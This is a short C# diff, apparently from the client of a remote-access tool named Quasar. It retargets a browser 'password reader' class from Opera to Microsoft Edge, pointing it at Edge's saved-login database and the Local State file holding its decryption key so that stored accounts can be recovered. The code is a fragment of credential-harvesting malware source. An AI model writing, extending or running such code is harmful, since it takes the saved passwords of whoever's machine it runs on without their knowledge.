@@ -5,20 +5,20 @@ using System.IO;
 
 namespace Quasar.Client.Recovery.Browsers
 {
-    public class OperaPassReader : ChromiumBase
+    public class EdgePassReader : ChromiumBase
     {
         /// <inheritdoc />
-        public override string ApplicationName => "Opera";
+        public override string ApplicationName => "Microsoft Edge";
 
         /// <inheritdoc />
         public override IEnumerable<RecoveredAccount> ReadAccounts()
         {
             try
             {
-                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "Opera Software\\Opera Stable\\Login Data");
-                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "Opera Software\\Opera Stable\\Local State");
+                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                    "Microsoft\\Edge\\User Data\\Default\\Login Data");
+                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                    "Microsoft\\Edge\\User Data\\Local State");
                 return ReadAccounts(filePath, localStatePath);
             }
             catch (Exception)
